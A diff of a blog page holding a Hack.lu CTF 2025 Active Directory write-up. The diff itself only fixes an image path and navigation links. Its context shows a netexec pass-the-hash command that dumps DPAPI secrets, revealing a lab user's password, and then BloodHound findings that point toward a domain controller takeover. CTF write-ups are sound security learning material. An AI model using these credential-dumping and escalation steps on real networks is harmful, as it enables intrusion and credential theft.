@@ -153,7 +153,7 @@
 <h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><p>Let’s use the administratör account to look for DPAPI using the <code>--dpapi</code> flag from netexec</p>
 <figure class="highlight terminal bash"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb srv02.hack.lu -u &#x27;administratör&#x27; -H 09a38021b2ecb464dda2d27ca8ef5233 --local-auth --dpapi</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:SRV02) (signing:True) (SMBv1:None)</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [+] SRV02\administratör:09a38021b2ecb464dda2d27ca8ef5233 (Pwn3d!)</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [*] Collecting DPAPI masterkeys, grab a coffee and be patient...</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [+] Got 4 decrypted masterkeys. Looting secrets...</span><br><span class="line out">SMB         10.244.0.11     445    SRV02            [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:&#123;03AB09A0-D6E7-4FE2-9005-5F21B10E3DD1&#125; - HACK\maja.lindgren:Z4f8hF2t#K3HJsfGJX!&amp;</span><br></pre></td></tr></table></figure>
 <p>Nice! it dumped the password of the user <code>maja.lindgren</code></p>
-<h1 id="DC01-Takeover"><a href="#DC01-Takeover" class="headerlink" title="DC01 Takeover"></a>DC01 Takeover</h1><p>Looking at bloodhound, we can see that this user has some interesting permissions<br><img src="/loaf/loaf/AKTIVKATALOG-2-Hack-lu-CTF-2025/dc.png" alt="BloodHound showing maja.lindgren&#39;s permissions"></p>
+<h1 id="DC01-Takeover"><a href="#DC01-Takeover" class="headerlink" title="DC01 Takeover"></a>DC01 Takeover</h1><p>Looking at bloodhound, we can see that this user has some interesting permissions<br><img src="/loaf/AKTIVKATALOG-2-Hack-lu-CTF-2025/dc.png" alt="BloodHound showing maja.lindgren&#39;s permissions"></p>
 <ul>
 <li><code>maja.lindgren</code> has <code>AddMember</code> over <code>KONTOANSVARIGA</code> group</li>
 <li><code>KONTOANSVARIGA</code> has <code>AllExtendedRights</code> over DC01</li>
@@ -184,9 +184,9 @@
         
         <li><time datetime="2024-08-18T22:34:29.000Z">2024-08-18</time><a href="/loaf/Reflection-Vulnlab/">Reflection - Vulnlab</a></li>
         
-        <li><time datetime="2025-06-15T16:22:03.000Z">2025-06-15</time><a href="/loaf/Pwning-Reflection-Using-NTLM-Reflection/">Pwning Reflection Using NTLM Reflection</a></li>
+        <li><time datetime="2026-11-18T22:46:44.000Z">2026-11-18</time><a href="/loaf/GameMaster-Kenolab/">GameMaster - Kenolab</a></li>
         
-        <li><time datetime="2024-07-14T10:32:45.000Z">2024-07-14</time><a href="/loaf/Phantom-Vulnlab/">Phantom - Vulnlab</a></li>
+        <li><time datetime="2025-06-15T16:22:03.000Z">2025-06-15</time><a href="/loaf/Pwning-Reflection-Using-NTLM-Reflection/">Pwning Reflection Using NTLM Reflection</a></li>
         
       </ul>
     </section>
@@ -194,7 +194,7 @@
     
     <nav class="neighbors" aria-label="more posts">
       <a class="older" href="/loaf/AKTIVKATALOG-1-Hack-lu-CTF-2025/" rel="next"><small>← older</small>AKTIVKATALOG 1 - Hack.lu CTF 2025</a>
-      
+      <a class="newer" href="/loaf/GameMaster-Kenolab/" rel="prev"><small>newer →</small>GameMaster - Kenolab</a>
     </nav>
     
   </footer>
